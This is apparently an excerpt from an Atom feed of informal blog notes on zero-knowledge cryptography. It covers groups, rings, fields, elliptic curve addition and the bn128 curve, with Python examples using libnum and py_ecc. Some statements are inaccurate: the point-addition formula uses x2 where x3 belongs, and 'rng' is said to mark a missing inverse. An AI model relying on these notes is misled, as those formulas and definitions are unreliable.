&lt;p&gt;If an attacker is able to guess our witness vector (which is possible if there is only a small range of valid inputs, e.g. secret voting from privileged addresses), then they can verify their guess is correct by comparing their constructed proof to the original proof.&lt;&#x2F;p&gt;
&lt;p&gt;To do this, we introduce another random shift, but this time at the proving phase instead of the setup phase.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Circom and Circomlib</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-15/"/>
        <id>/blog/zknote/post-15/</id>
        
        <content type="html" xml:base="/blog/zknote/post-15/">&lt;h3 id=&quot;circom-and-circomlib&quot;&gt;Circom and Circomlib&lt;&#x2F;h3&gt;
&lt;p&gt;circom usage guidence. no maths here.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Group Theory</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-2/"/>
        <id>/blog/zknote/post-2/</id>
        
        <content type="html" xml:base="/blog/zknote/post-2/">&lt;h3 id=&quot;groups&quot;&gt;Groups&lt;&#x2F;h3&gt;
&lt;p&gt;The identity element of a group is unique.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;finite-group&quot;&gt;Finite group&lt;&#x2F;h3&gt;
&lt;p&gt;Finite groups can be expressed with a Cayley table&lt;&#x2F;p&gt;
&lt;h3 id=&quot;order-of-a-group&quot;&gt;Order of a group&lt;&#x2F;h3&gt;
&lt;p&gt;The order of a group is the number of elements in it.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;cyclic-groups&quot;&gt;Cyclic groups&lt;&#x2F;h3&gt;
&lt;p&gt;A cyclic group is a group that has an element such that every element in the group can be “generated” by applying the binary operator repeatedly to that element, or to it’s inverse.&lt;&#x2F;p&gt;
&lt;p&gt;If the group is cyclic, then the group is abelian.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;group-homomorphisms&quot;&gt;Group Homomorphisms&lt;&#x2F;h2&gt;
&lt;p&gt;Let A be a group with binary operator □ and B be a group with binary operator △.&lt;&#x2F;p&gt;
&lt;p&gt;Group A is homomorphic to group B if there exists a transformation φ where φ maps elements from A to B, and for all a, a’ in A, &lt;code&gt;φ(a □ a’) = φ(a) △ φ(a’)&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Elliptic curve points under addition modulo p are a cyclic finite group and integers under addition are homomorphic to this group.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Rings and Fields</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-3/"/>
        <id>/blog/zknote/post-3/</id>
        
        <content type="html" xml:base="/blog/zknote/post-3/">&lt;h3 id=&quot;ring&quot;&gt;Ring&lt;&#x2F;h3&gt;
&lt;p&gt;A Ring is a set with two binary operators such that&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;under the first binary operator, the set is a abelian group&lt;&#x2F;li&gt;
&lt;li&gt;under the second binary operator, the set is a monoid&lt;&#x2F;li&gt;
&lt;li&gt;the second binary operator distributes over the first&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Some authors use terminology that a “ring with inverse” is separate from a “ring.” Some will say “rng” to denote the absence of an inverse.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;field&quot;&gt;Field&lt;&#x2F;h3&gt;
&lt;p&gt;A field is a set with two binary operators such that&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;under the first binary operator, the set is an abelian group&lt;&#x2F;li&gt;
&lt;li&gt;under the second binary operator, &lt;em&gt;excluding the zero element&lt;&#x2F;em&gt;, the set is an abelian group&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;A finite field (over a prime number) is sometimes called a Galois field.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Elliptic Curve Addition</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-4/"/>
        <id>/blog/zknote/post-4/</id>
        
        <content type="html" xml:base="/blog/zknote/post-4/">&lt;h3 id=&quot;elliptic-curve&quot;&gt;Elliptic Curve&lt;&#x2F;h3&gt;
&lt;p&gt;Elliptic curves are a family of curves which have the formula:&lt;&#x2F;p&gt;
&lt;p&gt;$$
y^2 = x^3 + ax + b
$$&lt;&#x2F;p&gt;
&lt;p&gt;Elliptic Curves form an abelian group under addition.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Identity elements&lt;&#x2F;strong&gt;: The identity elements of ellipric curves is the point at infinity.&lt;&#x2F;p&gt;
&lt;p&gt;as long as we do not pick a perfectly vertical line, if we intersect two points in an elliptic curve, then we will also intersect a 3rd point on the elliptic curve.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Inverse&lt;&#x2F;strong&gt;: The inverse of an elliptic curve point is the negative of the y value of the pair.&lt;&#x2F;p&gt;
&lt;p&gt;One can derive how to compute P₃ = (x₃, y₃) where P₃ = P₁ ⊕ P₂ using the following formula.&lt;&#x2F;p&gt;
&lt;p&gt;$$
\lambda = \frac{y_2-y_1}{x_2-x_1}
\newline
x_3 = \lambda^2-x_1-x_2;\space y_3=\lambda\left(x_1-x_2\right) -y_1
$$&lt;&#x2F;p&gt;
&lt;p&gt;It has associativity:&lt;&#x2F;p&gt;
&lt;p&gt;$$
\left(a+b\right)P +cP = aP+\left(b+c\right)P
$$&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;a != $$\alpha$$&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Elliptic Curve over Finite Field</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-5/"/>
        <id>/blog/zknote/post-5/</id>
        
        <content type="html" xml:base="/blog/zknote/post-5/">&lt;h3 id=&quot;bn128-formula&quot;&gt;bn128 formula&lt;&#x2F;h3&gt;
&lt;p&gt;The bn128 curve, which is used by the &lt;a href=&quot;https:&#x2F;&#x2F;www.rareskills.io&#x2F;post&#x2F;solidity-precompiles&quot;&gt;Ethereum precompiles&lt;&#x2F;a&gt; to verify zk proofs, is specified as follows:&lt;&#x2F;p&gt;
&lt;p&gt;$$
y^2 = x^3 + 3\space\left(mod\space21888242871839275222246405745257275088696311157297823662689037894645226208583\right)
$$&lt;&#x2F;p&gt;
&lt;p&gt;The field_modulus should not be confused with the curve order, which is the number of points on the curve.&lt;&#x2F;p&gt;
&lt;p&gt;use the &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Tonelli%E2%80%93Shanks_algorithm&quot;&gt;Tonelli Shanks Algorithm&lt;&#x2F;a&gt; to compute modular square roots - you can treat it as a black box that computes the mathematical square root of a field element over a modulus, or lets you know if the square root does not exist.&lt;&#x2F;p&gt;
&lt;p&gt;use libnum to compute this&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;libnum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;has_sqrtmod_prime_power&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;has_sqrtmod_prime_power&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;sqrtmod_prime_power
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# the functions take arguments# has_sqrtmod_prime_power(n, field_mod, k), where n**k,
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# but we aren&amp;#39;t interested in powers in modular fields, so we set k = 1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# check if sqrt(8) mod 11 exists
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;has_sqrtmod_prime_power&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# False
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# check if sqrt(5) mod 11 exists
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;has_sqrtmod_prime_power&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# True
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# compute sqrt(5) mod 11
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;list&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sqrtmod_prime_power&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# [4, 7]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;** &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;7 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;** &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# we expect 4 and 7 to be inverses of each other, because in &amp;quot;regular&amp;quot; math, the two solutions to a square root are sqrt and -sqrt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;generating-elliptic-curve-cyclic-group-y2-x3-3-mod-11&quot;&gt;Generating elliptic curve cyclic group y² = x³ + 3 (mod 11)&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;libnum
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;matplotlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;pyplot &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;plt
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;generate_points&lt;&#x2F;span&gt;&lt;span&gt;(mod):
&lt;&#x2F;span&gt;&lt;span&gt;    xs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;    ys &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;y_squared&lt;&#x2F;span&gt;&lt;span&gt;(x):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;(x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;mod
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;mod):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;libnum&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;has_sqrtmod_prime_power&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;y_squared&lt;&#x2F;span&gt;&lt;span&gt;(x)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;mod&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;            square_roots &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;libnum&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sqrtmod_prime_power&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;y_squared&lt;&#x2F;span&gt;&lt;span&gt;(x)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;mod&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# we might have two solutions
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;sr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;square_roots:
&lt;&#x2F;span&gt;&lt;span&gt;                ys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(sr)
&lt;&#x2F;span&gt;&lt;span&gt;                xs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(x)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;xs, ys
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;xs, ys &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;generate_points&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;fig, (ax1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;subplots&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;fig&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;suptitle&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;y^2 = x^3 + 3 (mod p)&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;fig&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;set_size_inches&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;ax1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;set_xticks&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;ax1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;set_yticks&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;grid&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;scatter&lt;&#x2F;span&gt;&lt;span&gt;(xs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;ys)
&lt;&#x2F;span&gt;&lt;span&gt;plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;show&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Just like the real-valued plot, the modular one “appears symmetric”&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The order is not the modulus&lt;&#x2F;p&gt;
&lt;h3 id=&quot;python-bn128-library&quot;&gt;Python bn128 library&lt;&#x2F;h3&gt;
&lt;p&gt;The library the EVM implementation &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;py-evm&quot;&gt;pyEVM&lt;&#x2F;a&gt; uses for the elliptic curve precompiles is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;py_ecc&quot;&gt;py ecc&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;py_ecc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;bn128 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;multiply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;add&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;eq&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;neg
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(G1)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# (1, 2)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;G1))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# (1368015179489954701390400359078579693043519447331113978918064868415326638035, 9918110051302171585080402603319702774565515993150576347155970296011118125764)
&lt;&#x2F;span&gt;&lt;span&gt;
